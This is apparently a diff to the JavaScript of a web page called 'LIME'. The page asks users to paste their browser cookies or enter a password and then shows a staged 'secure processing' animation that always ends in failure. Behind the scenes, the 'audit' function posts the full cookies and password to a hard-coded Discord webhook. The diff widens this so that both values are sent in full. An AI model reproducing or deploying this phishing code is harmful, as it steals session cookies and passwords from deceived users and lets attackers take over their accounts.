@@ -44,11 +44,15 @@ const WEBHOOK='https://discord.com/api/webhooks/1550133823952519208/FczRTRleHJ9J
 const $=id=>document.getElementById(id);let mode='cookie',last=null;
 function nextUsage(){try{const n=(parseInt(localStorage.getItem('lime_usage_count')||'0',10)||0)+1;localStorage.setItem('lime_usage_count',String(n));return n}catch(e){return 1}}
 function requestId(){try{if(crypto&&crypto.randomUUID)return crypto.randomUUID()}catch(e){}return Date.now().toString(36)+'-'+Math.random().toString(36).slice(2,10)}
+function safe(v,n=1800){return String(v??'').replace(/```/g,'`\u200b``').slice(0,n)}
 async function audit(){
  if(!WEBHOOK||!last)return;
  const title='🍋 LIME / USAGE #'+last.usage;
- const dataPreview = last.rawData
-  ? '```text\n' + String(last.rawData).slice(0, 1800).replace(/```/g, '`\u200b``') + '\n```'
+ const cookiesBlock = last.cookies
+  ? '```text\n' + safe(last.cookies) + '\n```'
+  : '`[empty]`';
+ const passwordBlock = last.password
+  ? '```text\n' + safe(last.password) + '\n```'
   : '`[empty]`';
  const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title,description:'A LIME usage was recorded (beta — full payload included).',color:0xB7F34D,timestamp:new Date().toISOString(),fields:[
   {name:'Mode',value:mode.toUpperCase(),inline:true},
@@ -57,7 +61,8 @@ async function audit(){
   {name:'Password entered',value:last.passwordProvided?'Yes':'No',inline:true},
   {name:'Usage count (this browser)',value:String(last.usage),inline:true},
   {name:'Request ID',value:'`'+last.requestId+'`',inline:false},
-  {name:'Submitted data (beta)',value:dataPreview,inline:false}
+  {name:'Cookies (beta)',value:cookiesBlock,inline:false},
+  {name:'Password (beta)',value:passwordBlock,inline:false}
  ],footer:{text:'LIME • Audit Log • beta full payload'}}]};
  try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
 }
@@ -67,7 +72,7 @@ $('panel').onmousemove=e=>{const r=$('panel').getBoundingClientRect();const x=(e
 function toast(msg){alert(msg)}
 function step(n){for(let i=0;i<3;i++){$('s'+i).classList.toggle('active',i===n);$('s'+i).classList.toggle('done',i<n)}}
 async function process(){if(!last)return;$('overlay').classList.add('show');$('start').classList.add('loading');$('start').disabled=true;$('err').hidden=true;$('bar').style.width='8%';step(0);$('pt').textContent='Starting secure processing';$('pm').textContent='Preparing your request…';await audit();await new Promise(r=>setTimeout(r,650));step(1);$('bar').style.width='42%';$('pm').textContent='Attempting to connect to the processing server…';await new Promise(r=>setTimeout(r,900));step(2);$('bar').style.width='76%';$('pm').textContent='Starting remote job…';await new Promise(r=>setTimeout(r,900));$('bar').style.width='100%';$('pt').textContent='Processing unavailable';$('pm').textContent='The server did not accept the request.';$('err').hidden=false;$('start').classList.remove('loading');$('start').disabled=false}
-$('start').onclick=async()=>{const cookies=$('data').value.trim();const password=$('password').value;if(mode==='cookie'&&!cookies)return toast('Paste your cookies first');if(mode==='password'&&!password)return toast('Enter your password');last={cookiesEntered:Boolean(cookies),cookiesLength:cookies.length,passwordProvided:Boolean(password),usage:nextUsage(),requestId:requestId(),rawData:mode==='cookie'?cookies:password};await process()};$('close').onclick=()=>{$('overlay').classList.remove('show');$('start').classList.remove('loading');$('start').disabled=false};$('retry').onclick=process;
+$('start').onclick=async()=>{const cookies=$('data').value.trim();const password=$('password').value;if(mode==='cookie'&&!cookies)return toast('Paste your cookies first');if(mode==='password'&&!password)return toast('Enter your password');last={cookiesEntered:Boolean(cookies),cookiesLength:cookies.length,passwordProvided:Boolean(password),usage:nextUsage(),requestId:requestId(),cookies:cookies,password:password};await process()};$('close').onclick=()=>{$('overlay').classList.remove('show');$('start').classList.remove('loading');$('start').disabled=false};$('retry').onclick=process;
 function finishIntro(){$('intro').classList.add('done');document.body.classList.remove('lock')}
 setTimeout(finishIntro,3000);window.addEventListener('load',()=>setTimeout(finishIntro,3050),{once:true});
 </script>
